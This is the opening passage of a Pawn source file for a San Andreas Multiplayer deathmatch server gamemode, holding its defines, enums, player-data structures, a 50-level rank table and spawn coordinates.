/*
	* SAMP-IL.com (last Vgames) DeathMatch #4
	* © Copyright 2008-2009, Amit Barami (`Amit_B`)
	* Type:				SanAndreas:MultiPlayer 0.3.0
	* Version:			0.4.6
	* Creation Date:	01/04/2008
	* Creation Date #2: 17/11/2008
	* Creation Date #3: 29/06/2009
	* Creation Date #4: 18/07/2009 (updated to SA-MP 0.3.0 on 02/09/2009)
*/
//=[Includes]===================================================================
#include "a_samp.inc"
#include "core.inc"
#include "float.inc"
#include "string.inc"
#include "file.inc"
#include "time.inc"
#include "datagram.inc"
#include "a_players.inc"
#include "a_vehicles.inc"
#include "a_objects.inc"
#include "a_sampdb.inc"
#include "antideamx.inc"
#tryinclude "pwncurl.inc"
#tryinclude "keys.inc"
#tryinclude "streamer3.inc"
#tryinclude "astreamer.inc"
//=[Defines]====================================================================
// Main:
#define webpage "SAMP-IL.com"
#define comname "SAMP-IL"
#define version "0.4.6"
#define respawntime 60
#define spawnmoney 750
#define maxping 800
#define max_properties 200
#define start_sound 1076
#define debug_state false
#define new_lan false
#define purim_now false
#define srvip "195.189.140.32"
#define adv_allow "allowadv*"
#define server_version "0.3a R4" // "0.2X (+VG)" [old] (For Kye's ask, removed)
#define ventip "80.179.153.12"
#define ventport "11215"
#define updates "66"
#define last_update "07.07.2010"
#define MAX_CLANS 150
#define max_houses 300
#define max_houseacc 20
#define DFairPlay false
#if DFairPlay == true
	#tryinclude "dfairplay_serverside.inc"
#endif
#define trainings false
#define M_S 200
#define M_S_D 2048
#define max_cbank 10000000
#define acmoney 1
#define MAX_FIREWORKS 300
#define second_auto_message_seconds 5
#define usingYSF true
#if usingYSF
	#tryinclude "YSF.inc"
#endif
#define event_max 2
#define acname "APGuard"
#define MAX_NPCS 100
#define upower_cost 10000000
#undef MAX_PLAYERS
#define MAX_PLAYERS 350
// ReDefines:
#undef INVALID_MENU
#undef INVALID_TEXT_DRAW
#define INVALID_MENU (Menu:0xFF)
#define INVALID_TEXT_DRAW (Text:0xFFFF)
// Objects:
#define max_objects 5000
#define object_show_distance 200.0
#define streamerT 0 // 0 = Mido 1 = AStreamer
#if defined _astreamer_included && streamerT != 1
	#undef SetPlayerPos
	#undef SetVehiclePos
#endif
// Folders:
#define folder_dm "/DM/"
#define folder_clans "/DM/Clans/"
#define folder_users "/DM/Users/"
#define folder_bans "/DM/Bans/"
#define folder_props "/DM/Properties/"
#define folder_logs "/DM/Logs/"
#define folder_ip "/DM/Bans/IP/"
#define folder_houses "/DM/Houses/"
#define folder_activities "/DM/Activities/"
#define folder_info "/DM/Info/"
#define folder_infopm "/DM/Info/PMs/"
#define folder_infobl "/DM/Info/BankLog/"
#define folder_backups "/DM/Backups/"
// Files:
#define file_rules "/DM/Rules.txt"
#define file_am "/DM/AutoMessage.txt"
#define file_bb "/DM/BulletinBoard.ini"
#define file_words "/DM/Censoring.txt"
#define file_cps "/DM/Checkpoints.txt"
#define file_props "/DM/Properties.txt"
#define file_nbans "/DM/NBans.ini"
#define file_clans "/DM/Clans/Clans.ini"
#define file_vstore "/DM/VehiclesOwners.ini"
#define file_admins "/DM/Admins.ini"
//#define file_users "/DM/Users.txt"
#define file_houses "/DM/Houses.txt"
#define file_bugs "/DM/Bugs.txt"
#define file_advices "/DM/Advices.txt"
#define file_preports "/DM/PlayerReports.txt"
#define file_areports "/DM/AdminReports.txt"
#define file_codes "/DM/Codes.ini"
#define file_vip "/DM/VIPs.ini"
#define file_pickups "/DM/Pickups.ini"
// Colors:
#define yellow 0xFFFF00FF
#define green 0x33FF33FF
#define red 0xFF0000FF
#define white 0xFFFFFFFF
#define pink 0xCCFF00FFFF
#define blue 0x0000BBFF
#define grey 0xC0C0C0FF
#define lightblue 0x00FFFFFF
#define orange 0xFF9900FF
#define black 0x000000FF
#define darkblue 0x2641FEAA
#define purple 0x800080FF
#define brown 0x993300FF
/*#define yellow 0xe7ea7cff
#define green 0x00ed00ff
#define red 0xff6a6aff
#define white 0xffffffaa
#define pink 0xccff00ff
#define blue 0x5455ffff
#define grey 0xc0c0c0AA
#define lightblue 0x00edc2ff
#define orange 0xf7a26fff
#define black 0x000000aa
#define darkblue 0x3399ffaa
#define purple 0x800080aa
#define brown 0xb15a00ff*/
#define vipcol /*rgba2hex(196,196,196,100)*/0xc0fec0ff
// Checkpoints:
#define max_checkpoints 500
#define cp_none 0
#define cp_bank 1
#define cp_ammu 2
#define cp_wang 3
#define cp_sammu 4
#define cp_cbank 5
#define cp_clothes 6
#define cp_superbonuses 7
#define cp_vgarage 8
#define cp_bar 9
#define default_cpsize 2.500000
#define default_cpdistance 45.000000
// World:
#define world_normal 0
#define world_mode 1
#define world_ghosts 2
#define world_war 3
#define world_race 4
#define world_wwe 5
#define world_kart 6
#define world_monster 7
#define world_srace 8
#define world_kickstar 9
#define world_22 10
#define world_dm_sm 11
#define world_dm_mm 12
#define world_dm_ww 13
#define world_dm_jetp 14
#define world_dm_matrix 15
#define world_dm_rc 16
#define world_dm_heavy 17
#define world_wstunts 18
#define world_shooting 19
#define world_purim 20
#define world_count 21
#define max_worlds 5000
// Works:
#define work_none 0
#define work_cop 1
#define work_doctor 2
#define work_taxi 3
#define work_bus 4
#define work_train 5
#define work_pilot 6
#define work_weapons 7
#define work_killer 8
#define work_icecream 9
#define work_drugs 10
// DM Zones:
#define dmz_none 0
#define dmz_sm 1
#define dmz_mm 2
#define dmz_ww 3
#define dmz_jetp 4
#define dmz_matrix 5
#define dmz_rc 8
#define dmz_heavy 9
// Pets:
#define pet_none 0
#define pet_fish 1
#define pet_jelly 2
#define pet_rjelly 3
#define pet_turtle 4
#define pet_dolphin 5
#define pet_shark 6
// Races:
#define race1_cars 0
#define race2_bikes 1
#define race3_planes 2
#define race4_boats 3
#define race5_crazy 4
// Icons:
#define icon_player 0
#define icon_bank 1
#define icon_wang 2
#define icon_wang2 3
#define icon_race 4
#define icon_lvap 5
#define icon_sfap 6
#define icon_lsap 7
#define icon_ships 8
#define icon_docks 9
#define icon_quarry 10
#define icon_pirate 11
#define icons_count 12
// Dialogs:
#define dialog_login 0
#define dialog_register 1
#define dialog_wrongpass 2
#define dialog_badregister 3
#define dialog_ni 4
#define dialog_changepass 5
#define dialog_changename 6
#define dialog_wrongchangepass 7
#define dialog_wrongchangename 8
#define dialog_tm 9
#define dialog_wrongtp 10
#define dialog_baccount 11
#define dialog_wrongbaccount 12
#define dialog_banklog 13
#define dialog_bank 14
#define dialog_deposit 15
#define dialog_withdraw 16
#define dialog_baccpass 17
#define dialog_ammu 18
#define dialog_bw 19
#define dialog_bwwrong 20
#define dialog_clickplayer 21
#define dialog_pm 22
#define dialog_report 23
#define dialog_pay 24
#define dialog_transfer 25
#define dialog_baccw1 26
#define dialog_baccw2 27
#define dialog_baccw3 29
#define dialog_baccb 30
#define dialog_upowers 31
#define dialog_upowerinfo 32
// Moving Text:
#define MAX_MOVING_TEXTS 10
#define MAX_MOVINGTEXT_LENGTH M_S * 2
#define MOVINGTEXT_ADD_POS -2.0
#define mt_activity 0
#define mt_admin 1
// Functions:
#define fileCheck(%1) if(!fexist(%1)) fcreate(%1)
#if usingYSF
	#define folderCheck(%1) if(!fexist(%1)) dcreate(%1)
#else
	#define folderCheck(%1) if(!fexist(%1)) printf(" Folder %s is not found.",%1)
#endif
#define fixchars(%1) for(new fix=0;fix<strlen(%1);fix++) if(%1[fix] < 0) %1[fix] += 256
#define GetVehicleName(%1) VehicleNames[%1-400]
stock strval_fix(string[]) return strlen(string) > 49? 0 : strval(string);
#define strval strval_fix
#define dbg(%1,%2) if(debugstate) print("DEBUG " #%1 " " %2)
#define ShowPlayerDialog2 ShowPlayerDialog
#define fwrite fwrite_utf8
#define SetPlayerSkillLevel SetPlayerSkillLevel2
#define gettime gettime2
#define SetPlayerName SetPlayerName2
//=[Forwards]===================================================================
forward Contents();
forward Contents3();
forward AutoMessage();
forward UnGod(playerid,Float:lastth);
forward StartWar();
forward StartWar2();
forward StartActivity();
forward StartRace(racetype,raceway);
forward StartRace2();
forward StartWWE();
forward StartWWE2();
forward UnFreeze(playerid);
forward StartActivity2();
forward Lotto();
forward Lotto2();
forward PetAttacking(playerid,id);
forward UnMute(playerid);
forward UnJail(playerid);
forward AirAttack1(playerid);
forward AirAttack2(playerid);
forward AirAttack3(playerid);
forward CountDown(withf);
forward StartKart();
forward StartKart2();
forward CheckKart();
forward StartMonster();
forward StartMonster2();
forward CheckpointsSystem();
forward PropertiesPay();
forward OnPlayerTeamPrivmsg(playerid,msg[]);
forward AntiCheat();
forward Contents2();
forward OnRconCommandEx(cmd[]);
forward CanA(playerid);
forward CanS(playerid);
forward CanAFK(playerid);
forward BotWrite2();
forward StartSRace();
forward StartSRace2();
forward DestroyPickup2(pid);
forward Explosion(playerid,bombid,bp1,bp2,bp3);
forward CanWithdraw(playerid);
forward playerCanUseAnim(playerid);
forward BattleCD(playerid,playerid2);
forward DriftCD(playerid,playerid2);
forward PutInVehicle(playerid,vehicleid,seat);
forward Math();
forward Math2();
forward Trivia();
forward Trivia2();
forward CanP(playerid);
forward FireworksLine(Float:x,Float:y,Float:z,count);
forward FireworksMatar(Float:x,Float:y,Float:z,count);
forward allowSICommand();
forward VIPSuicide(playerid);
forward Reporting(id);
forward DeleteSuperbonus(playerid);
forward WeHateYou(playerid);
forward SiteUpdate();
forward OnPlayerPrivmsg(playerid,recieverid,text[]);
forward StartKickstar();
forward StartKickstar2();
forward WinKickstar();
forward PropertyDeleting(propname[]);
forward BotStopTalkingTo();
forward OnSObjectMoved(oid,Float:x,Float:y,Float:z);
forward OnPlayerAmmoChange(playerid, oldammo, newammo, weapon);
forward MoveText(textid);
forward Replytest();
forward Replytest2();
forward StartNPCRace(playerid,blevel);
forward EndNPCRace(playerid,bot);
forward HideMarkers(playerid,id);
forward FireBallExplosion(objectid);
forward OnPlayerHealthChange(playerid, Float:newhealth, Float:oldhealth);
forward OnPlayerArmourChange(playerid, Float:newarmour, Float:oldarmour);
forward ResetCopypower(playerid);
forward RemoteCreateSObject(modelid,Float:xpos,Float:ypos,Float:zpos,Float:xrot,Float:yrot,Float:zrot,Float:showdis,interior,world);
forward HydrogenBoom(playerid);
//=[Enums]======================================================================
enum PlayerInfoData
{
	afk,
	Float:startpos[3],
	spawned,
	logged,
	admin,
	admlog,
	faileds,
	intime[2],
	color[3],
	kills,
	deaths,
	level,
	copypower[2],
	upower,
	charge,
	upower2,
	charge2,
	upower3[2],
	bank,
	ccard,
	skin,
	weapons[10],
	ammo[8],
	vehicle,
	icq,
	messenger[50],
	email[50],
	country[50],
	birthdate[3],
	rname[50],
	pic,
	lastmetext[M_S],
	lasttext[M_S],
	lastpmtext[M_S],
	death[7],
	invisible,
	cp,
	incp,
	#if acmoney == 2
	money[3],
	moneywarns,
	#elseif acmoney == 1
	money[2],
	#endif
	propertyid,
	waitwar,
	inwar,
	waitrace,
	warid,
	inrace,
	racecp,
	raceid,
	waitwwe,
	inwwe,
	wweid,
	viewerwwe,
	work,
	coplevel,
	doctorlevel,
	drivecost,
	killerlevel,
	icecreamcost,
	drugs,
	drugsp,
	drugscost,
	plotto,
	dmzone,
	pet[5],
	dinvited,
	dinviter,
	bet,
	indrift,
	driftcp,
	dcd[2],
	binvited,
	binviter,
	dplace,
	inbattle,
	bweapon,
	bplace,
	bcd[2],
	gwarnings,
	Float:aapos[3],
	aav1,
	aav2[2],
	aav3[4],
	aasetp,
	aatimer,
	aause,
	bonus[4],
	bonus_si,
	mute[2],
	jail[2],
	togcmd,
	togsay,
	togpm,
	togph,
	toggc,
	togcc,
	togvip,
	showme,
	spectate,
	gang,
	igang,
	gm,
	clan,
	iclan,
	lclan,
	tclan,
	calling,
	callid,
	caller,
	canswer,
	class,
	waitkart,
	inkart,
	kartv,
	waitmonster,
	inmonster,
	monsterv,
	vip,
	gw,
	reqclass,
	idchat,
	showjoin,
	showquit,
	showmt,
	autologin,
	showafk,
	showpunish,
	inact,
	Float:lastcoords[3],
	Float:lasth[3],
	nocmd,
	nopm,
	mtime,
	slow,
	gmtimer,
	armour,
	Float:mark[3],
	mark2[3],
	flood[4],
	fwarns[3],
	tag[M_S],
	Float:slastpos[4],
	slastdata[4],
	incam,
	lastskin,
	ignore[MAX_PLAYERS],
	disconnect,
	dmzkills,
	frozen,
	Float:freezepos[3],
	blockpms,
	lastmoney,
	cana,
	cans,
	canafk,
	xjail,
	valarm,
	Float:lasthealth,
	seth,
	Float:lastarmour,
	seta,
	die,
	fkwarns,
	Float:speedpos[3],
	modeafk,
	usedafk,
	earnings,
	waitsrace,
	insrace,
	sracecp,
	sraceid,
	hitman,
	clanmanager,
	vipmanager,
	housemanager,
	codesmanager,
	mss,
	wlevel,
	wantedlevel,
	bomb,
	Float:bombpos[3],
	bombpickup,
	bombtime,
	hbombcount,
	banned,
	//conference,
	canwithdraw,
	houseid,
	house,
	inhouse,
	pp,
	houseacc[max_houses],
	jetpack,
	pleasemoney,
	pmath,
	angry[2],
	classselection,
	pinv,
	ptrivia,
	carjack[MAX_PLAYERS],
	canp,
	hidem,
	lastvmessage[M_S],
	vheal,
	vrocket,
	vsuicide[2],
	nr,
	boomcar,
	wehateyou,
	abf[2],
	sb,
	nswarns,
	lastpm,
	savepms,
	lucifer,
	waitkickstar,
	inkickstar,
	kickstarscore,
	kickstarid,
	incrane,
	cranetime,
	weaponammo[65],
	lastammo,
	lastweapon,
	dscmd,
	indialog,
	tinfo,
	inplane,
	inarmy,
	inshooting[12],
	savedweapons[13],
	savedammo[13],
	Float:afv[3],
	afvcheck[2],
	bacc,
	getloan,
	sdboxrob,
	clickon,
	upgradecmd[50],
	raise,
	pump,
	underearth,
	mapolet[7],
	Float:mapoletstart[7],
	fireball,
	quicklydefence,
	Float:phealth,
	Float:parmour,
	tornado,
	Float:torpos[3],
	wskill[11],
	wcwarns
};
enum VehicleInfoData
{
	lastdriver,
	locked,
	nitro,
	store,
	storecost,
	racedriver,
	kartdriver,
	monsterdriver,
	vvalid,
	vemodel,
	Float:vpos[4],
	vcol[2],
	veint,
	veworld,
	vevip
};
enum RandomSpawnsEnum
{
	Float:rsX,
	Float:rsY,
	Float:rsZ,
	Float:rsA,
	rsI
};
enum PicturesEnum
{
	Float:PCx,
	Float:PCy,
	Float:PCz,
	Float:PPx,
	Float:PPy,
	Float:PPz,
	Float:PPa,
	PInterior,
	PTime
};
enum TeleportsEnum
{
	Tcmd[M_S],
	Float:Tx,
	Float:Ty,
	Float:Tz,
	Float:Ta,
	Ti,
	Tw,
	Tl,
	Tauthor[32],
	bool:Twithv,
	bool:Tfreeze,
	bool:Tnoshooting
};
enum AmmunationEnum
{
	aName[M_S],
	aID,
	aCost,
	aAmmo,
	aLevel,
	aSlot
};
enum LevelsEnum
{
	NeedKills,
	NeedMoney,
	LevelName[M_S],
	BankLimit,
	AmmoLimit,
	Float:TeleHealth,
	Float:DeathHealth,
	Float:DeathArmour,
	AllowedLoan,
	RobSuccess
};
enum GangInfoData
{
	gplayers[25],
	gname[M_S],
	gexist,
	gmembers,
	gcolor[3],
	gbank,
	gleader
};
enum ClanInfoData
{
	cplayers[25],
	cname[M_S],
	cmembers,
	ccolor[3],
	cbank,
	cbankcp,
	ccmd[M_S],
	Float:chq[4],
	Float:chqv[4],
	ctest,
	cmute,
	cvalid,
	cobject[50],
	cobjects,
	clbank,
	cmaxbank,
	ccp,
	cpeace[MAX_CLANS],
	cask[MAX_CLANS]
};
enum ObjectInfoData
{
	omodel,
	ovalid,
	Float:opos[3],
	Float:orot[3],
	Float:sopos[3],
	Float:sorot[3],
	omoving[3], // 0=can move 1=clan 2=moving
	Float:omoveto[3],
	oattach,
	Float:oautomove[13]
};
enum VipHqEnum
{
	Float:vspos[4],
	Float:vsvpos[4],
	vint,
	vworld,
	vgangzone
};
enum CPs
{
	Float:cpx,
	Float:cpy,
	Float:cpz,
	Float:cpsize,
	Float:cpdis,
	cptype,
	cpclan
};
enum PropertiesEnum
{
	pname[M_S],
	Float:px,
	Float:py,
	Float:pz,
	pcost,
	pearning,
	owner
};
enum SRaceEnum
{
	srType,
	Float:srX,
	Float:srY,
	Float:srZ,
	Float:srA
};
enum BombsEnum
{
	bCost,
	bLevel,
	bValid,
	bName[M_S]
};
enum actInfoEnum
{
	actExist,
	actPlayers,
	actMax,
	actName[M_S],
	actEndJoin,
	actAdmin,
	actNeedVehicle
};
enum HousesEnum
{
	Float:hx,
	Float:hy,
	Float:hz,
	Float:hp[4],
	hint,
	hcost,
	hsize,
	hpickup
};
enum PickupInfoEnum
{
	pvalid,
	pmodel,
	Float:ppos[3],
	ptype,
	pfunc
};
enum TriviaEnum
{
	tQuestion[128],
	tAnswer1[64],
	tAnswer2[64],
	tAnswer3[64]
};
enum SBEnum
{
	sbName[M_S],
	sbCost,
	sbInterval
};
enum ColorEnum
{
	colName[32],
	colHex
};
enum ColorListsEnum
{
	ColorListName[32],
	colorsHex[9]
};
enum FirePlaceData
{
	fpStart,
	fpEnd,
	fpUpdate
};
enum MovingTextData
{
	Float:mtX,
	Float:mtY,
	mtText[MAX_MOVINGTEXT_LENGTH],
	mtTimer,
	mtUsing
};
enum NPCsData
{
	npcFile[16],
	npcName[MAX_PLAYER_NAME],
	npcVehicle,
	npcVehicleSeat,
	npcVehicleLocked,
	Text3D:npcText,
	npcSkin
};
enum BarData
{
	barSA,
	barName[16],
	barCash
};
enum lcmdsEnum
{
	lcCommand[32],
	lcLevel,
	lcCL,
	lcMaxCL,
	lcExplain[256],
	lcUpgradeCost
};
enum UPEnum
{
	upTitle[16],
	upText[M_S],
	upLevel1[M_S],
	upLevel2[M_S],
	upLevel3[M_S],
	upLevel4[M_S]
};
//=[Variables]==================================================================
new playerinfo[MAX_PLAYERS][PlayerInfoData];
new vehicleinfo[MAX_VEHICLES][VehicleInfoData];
new wangv = -1;
new words[128][128];
new words_count = 0;
new badweapons[] = {2,37,38,43,44,45};
new warinfo[6]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type 5=place
new warweapons[] = {22,23,24,25,26,27,28,29,30,31,32,34};
new raceinfo[7]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type, 5=wins, 6=way
new wweinfo[5]; // 0=have, 1=players, 2=seconds, 3=timer, 4=type
new wwejoins[2];
new lottonum[2] = {-1,-1};
new Text:modetxt;
new cd[3]; // 0=have, 1=seconds, 2=timer
new ganginfo[MAX_PLAYERS][GangInfoData];
new claninfo[MAX_CLANS][ClanInfoData];
new chatlocked;
new LockServ;
new objectinfo[max_objects][ObjectInfoData];
new kartinfo[4]; // 0=have, 1=players, 2=seconds, 3=timer
new monsterinfo[4]; // 0=have, 1=players, 2=seconds, 3=timer
new viphq[VipHqEnum];
new bool:debugstate = debug_state;
new cps = 0;
new cpinfo[max_checkpoints][CPs];
new props = 0;
new propinfo[max_properties][PropertiesEnum];
new max_ping = maxping;
new modeuse = false;
new rb = 0;
new randclass = 0;
new pickupinfo[400][PickupInfoEnum];
new boton = 1;
new botcolor = white;
new botname[MAX_PLAYER_NAME];
new botwrite = 0;
new bottag[M_S];
new bottalkingto[3] = INVALID_PLAYER_ID;
new Menu:bombshop;
new bombinfo[12][BombsEnum];
new sraceinfo[5]; // 0=have, 1=players, 2=seconds, 3=timer, 4=wins
new loadClans[M_S];
new actinfo[actInfoEnum];
new houses = 0;
new houseinfo[max_houses][HousesEnum];
new MoneyGZ[50] = {-1,...};
//new AntiKillGZ[50] = {-1,...};
#if DFairPlay == true
	new DFairPlayPing = 0;
#endif
#if usingYSF
	new setWorldTimeSeconds = 0;
#endif
new maths[6] = {-1,...};
new trivia[2] = {-1,-1};
//new bool:adminsTime = false;
new fireworks = 0;
new firework[MAX_FIREWORKS] = {-1,...};
new useFireworks = 1;
new fireworkTimer;
new fireworkLine = 0;
new siUsed = 0;
new Text:hidemap;
new autoM = 0;
new reporting[4] = {0,...};
new fpinfo[FirePlaceData] = 0;
new Menu:areYouSure[3];
new kickstarinfo[5]; // 0=have, 1=players, 2=seconds, 3=timer, 4=win
new lastAdv = INVALID_PLAYER_ID;
new afterHour = 0;
new botID = INVALID_PLAYER_ID;
new streamT = streamerT;
new Menu:shootingMenu;
new badnames[][32] = {"cheat","hack","fuck","gay","zain","zona"};
new Text:movingtext[MAX_MOVING_TEXTS];
new Float:movingtextinfo[MAX_MOVING_TEXTS][MovingTextData];
new replytest[M_S];
new replytestlevel = 0;
new npcVehicles[MAX_NPCS] = {-1,...};
new sdboxMoney = 0;
new x2kills;
new dontseedc = 0;
new levels[][LevelsEnum] =
{
	// level	kills,	money,		name,				maxbank,	ammo,	tele,	health,	armour, allowed loan,	rob
	/* 0	*/ {0,		0,			"Guest",			1000,		1,		80.0,	0.0,	0.0,	20000,			0}	,
	/* 1	*/ {0,		0,			"Noob",				10000,		4,		75.0,	0.0,	0.0,	20000,			0}	,
	/* 2	*/ {10,		2000,		"Newbie",			15000,		5,		70.0,	0.0,	0.0,	20000,			0}	,
	/* 3	*/ {25,		5000,		"New Player",		20000,		6,		70.0,	0.0,	0.0,	20000,			2}	,
	/* 4	*/ {50,		7500,		"Beginner",			30000,		7,		70.0,	0.0,	0.0,	20000,			2}	,
	/* 5	*/ {100,	10000,		"Novice",			50000,		8,		65.0,	0.0,	0.0,	15000,			4}	,
	/* 6	*/ {200,	15000,		"Nice Player",		75000,		9,		65.0,	0.0,	0.0,	15000,			4}	,
	/* 7	*/ {300,	20000,		"Good Player",		100000,		10,		65.0,	0.0,	0.0,	15000,			6}	,
	/* 8	*/ {400,	25000,		"Great Player",		150000,		12,		60.0,	10.0,	0.0,	15000,			6}	,
	/* 9	*/ {500,	30000,		"Criminal",			200000,		14,		60.0,	15.0,	0.0,	15000,			8}	,
	/* 10	*/ {650,	35000,		"Killer",			250000,		16,		60.0,	20.0,	0.0,	10000,			8}	,
	/* 11	*/ {800,	40000,		"Wanted",			300000,		18,		55.0,	25.0,	0.0,	10000,			10}	,
	/* 12	*/ {1000,	45000,		"Super Player",		400000,		20,		55.0,	30.0,	0.0,	10000,			10}	,
	/* 13	*/ {1200,	50000,		"Gangster",			500000,		22,		55.0,	40.0,	0.0,	10000,			12}	,
	/* 14	*/ {1400,	55000,		"Pro",				750000,		24,		50.0,	50.0,	0.0,	10000,			12}	,
	/* 15	*/ {1600,	60000,		"Super Pro",		1000000,	26,		50.0,	60.0,	0.0,	10000,			14}	,
	/* 16	*/ {1800,	65000,		"Amazing Player",	2000000,	28,		50.0,	70.0,	0.0,	10000,			14}	,
	/* 17	*/ {2000,	70000,		"Terminator",		4000000,	30,		45.0,	80.0,	0.0,	10000,			16}	,
	/* 18	*/ {2500,	80000,		"Champion",			7000000,	50,		45.0,	90.0,	0.0,	10000,			16}	,
	/* 19	*/ {3000,	90000,		"Genius",			10000000,	100,	45.0,	100.0,	0.0,	10000,			18}	,
	/* 20	*/ {3500,	100000,		"Superman",			0,			0,		40.0,	100.0,	5.0,	10000,			18}	,
	/* 21	*/ {4000,	110000,		"The Game",			0,			0,		40.0,	100.0,	10.0,	10000,			20}	,
	/* 22	*/ {4500,	120000,		"Veteran",			0,			0,		40.0,	100.0,	15.0,	10000,			21}	,
	/* 23	*/ {5000,	135000,		"Mega Man",			0,			0,		35.0,	100.0,	20.0,	10000,			22}	,
	/* 24	*/ {5500,	150000,		"Ultra Man",		0,			0,		35.0,	100.0,	30.0,	10000,			23}	,
	/* 25	*/ {6000,	165000,		"Crazy",			0,			0,		30.0,	100.0,	40.0,	10000,			24}	,
	/* 26	*/ {6500,	180000,		"Evil",				0,			0,		30.0,	100.0,	50.0,	10000,			25}	,
	/* 27	*/ {7000,	200000,		"Pro Gamer",		0,			0,		25.0,	100.0,	60.0,	10000,			26}	,
	/* 28	*/ {8000,	250000,		"DeathMatch Pro",	0,			0,		25.0,	100.0,	70.0,	10000,			27}	,
	/* 29	*/ {9000,	300000,		"Revenger",			0,			0,		20.0,	100.0,	80.0,	10000,			28}	,
	/* 30	*/ {10000,	400000,		"Cheater",			0,			0,		20.0,	100.0,	90.0,	10000,			29}	,
	/* 31	*/ {11000,	500000,		"Routine Cheater",	0,			0,		15.0,	100.0,	100.0,	10000,			30}	,
	/* 32	*/ {12000,	700000,		"Scary!",			0,			0,		15.0,	100.0,	100.0,	10000,			32}	,
	/* 33	*/ {13000,	800000,		"Incredible!",		0,			0,		12.5,	100.0,	100.0,	10000,			34}	,
	/* 34	*/ {14000,	900000,		"Fantastic!",		0,			0,		12.5,	100.0,	100.0,	10000,			36}	,
	/* 35	*/ {15000,	1000000,	"MadMan",			0,			0,		10.0,	100.0,	100.0,	10000,			38}	,
	/* 36	*/ {16500,	2000000,	"PoisoN",			0,			0,		10.0,	100.0,	100.0,	10000,			40}	,
	/* 37	*/ {18000,	3000000,	"SmarT",			0,			0,		7.5,	100.0,	100.0,	10000,			42}	,
	/* 38	*/ {20000,	4000000,	"Hell",				0,			0,		7.5,	100.0,	100.0,	10000,			44}	,
	/* 39	*/ {22000,	5000000,	"ExtremE",			0,			0,		5.0,	100.0,	100.0,	10000,			46}	,
	/* 40	*/ {24000,	7500000,	"GTA Pro",			0,			0,		5.0,	100.0,	100.0,	10000,			48}	,
	/* 41	*/ {26000,	10000000,	"King",				0,			0,		0.0,	100.0,	100.0,	10000,			50}	,
	/* 42	*/ {28000,	13000000,	"H4ck3r",			0,			0,		0.0,	100.0,	100.0,	10000,			50}	,
	/* 43	*/ {30000,	16000000,	"Master",			0,			0,		0.0,	100.0,	100.0,	10000,			50}	,
	/* 44	*/ {32000,	20000000,	"Angel",			0,			0,		0.0,	100.0,	100.0,	10000,			50}	,
	/* 45	*/ {34000,	25000000,	comname " Pro",		0,			0,		0.0,	100.0,	100.0,	10000,			50}	,
	/* 46	*/ {36000,	30000000,	"Imp",				0,			0,		0.0,	100.0,	100.0,	10000,			50}	,
	/* 47	*/ {38000,	35000000,	"Devil",			0,			0,		0.0,	100.0,	100.0,	10000,			52}	,
	/* 48	*/ {40000,	40000000,	"Goddess",			0,			0,		0.0,	100.0,	100.0,	10000,			52}	,
	/* 49	*/ {45000,	45000000,	"GOD",				0,			0,		0.0,	100.0,	100.0,	10000,			52}	,
	/* 50	*/ {50000,	50000000,	"GOD of GOD",		0,			0,		0.0,	100.0,	100.0,	10000,			55}
};
new RandomSpawns[][RandomSpawnsEnum] =
{
	// x, y, z, a, interior
	{2027.2678,997.7495,10.8203,274.5281,0},
	{2107.1382,1002.8745,11.0729,180.1215,0},
	{2043.2380,775.3530,11.4531,179.0168,0},
	{1639.1804,2075.7495,11.3125,89.3795,0},
	{2465.3857,2063.4890,10.8203,180.4817,0},
	{2512.4199,2123.2163,10.8405,5.8449,0},
	{2637.5476,2350.7200,10.8128,181.4153,0},
	{2086.7595,2079.6069,11.0579,262.8200,0},
	{2193.8494,1986.4493,12.2969,89.4824,0},
	{2018.2854,1920.6567,12.3418,267.1440,0},
	{1966.2148,1916.6877,130.9375,263.5423,0},
	{2127.6558,2374.0027,10.8203,182.3022,0},
	{2297.1160,2451.3779,10.8203,267.8663,0},
	{2262.5156,2036.3092,10.8203,74.0534,0},
	{1967.3387,1623.6886,12.8590,267.2295,0},
	{2209.8125,1285.3723,10.8203,90.9070,0},
	{2141.5471,1443.1781,10.8203,169.4619,0},
	{2600.2317,2097.2229,10.8175,358.0328,0},
	{2222.3972,1838.1414,10.8203,88.4552,0},
	{1640.6969,2044.7422,11.3199,91.8235,0},
	{2651.6982,2017.8877,14.1161,172.2884,0},
	{8.0673,1184.9136,19.4045,355.3555,0},
	{1930.6089,1342.8988,9.9688,260.9960,0},
	{1956.4465,1343.5537,15.3746,263.2455,0},
	{1673.9088,1447.7388,10.7841,275.6537,0},
	{1319.8588,1255.5870,14.2731,351.6064,0},
	{1099.3900,1603.6442,12.5469,0.2545,0},
	{453.2957,2505.2922,19.9466,88.4728,0},
	{2000.0106,1521.1111,17.0625,269.1425,0},
	{1588.0364,2803.1255,10.8203,4.4494,0},
	{2362.9961,1004.8198,14.2725,95.2309,0},
	{2091.6443,1162.8762,11.6552,62.5186,0},
	{2015.4705,1183.0233,10.8203,210.8287,0},
	{-2648.2146,-23.8357,6.1328,178.3902,0},
	{2186.2900,2162.1519,10.8203,180.5370,0},
	{1317.4495,2086.6626,14.1445,262.5291,0},
	{2291.6641,2775.2729,10.8203,274.3265,0},
	{1493.2626,697.8597,10.8203,350.3885,0},
	{1885.3438,2080.9561,11.0625,176.4869,0},
	{637.2173,827.4976,-40.1916,5.8280,0},
	{-661.8856,2304.8865,136.0320,85.4482,0},
	{2505.7478,-1686.4697,13.5510,39.2207,0},
	{2089.4409,1480.4780,10.8203,90.4783,0},
	{1958.5645,951.8033,10.8203,177.2820,0},
	{2110.5642,1332.5142,10.8203,88.3143,0},
	{1652.3995,2710.4441,10.8203,6.7831,0},
	{1489.1176,2772.6648,10.8203,90.2408,0}
};
new RandomCopSpawns[][RandomSpawnsEnum] =
{
	// x, y, z, a, interior
	{2294.2295,2450.8875,10.8203,87.1588,0},
	{2296.4866,2468.7349,10.8203,86.4319,0},
	{2250.5684,2490.7319,10.9908,3.6584,0}
};
new Pictures[][PicturesEnum] =
{
	// camera x, camera y, camera z, x, y, z, a, interior, time
	{1959.1257,1017.5651,992.4688,1952.8580,1017.9661,992.4688,267.1475,10,0},
	{1948.7920,1001.2288,992.4688,1952.4435,996.9414,992.8594,40.5165,10,0},
	{1940.7158,992.8408,992.4609,1941.1642,989.3764,992.4609,359.3246,10,0},
	{1937.2865,1017.8101,992.4688,1930.7357,1017.6057,993.8936,268.6256,10,0},
	{1959.6647,1056.5739,993.2023,1963.0117,1062.3979,994.4688,145.3957,10,0},
	{1991.8201,1017.5253,994.8906,1999.9467,1017.9258,994.6875,88.0784,10,0},
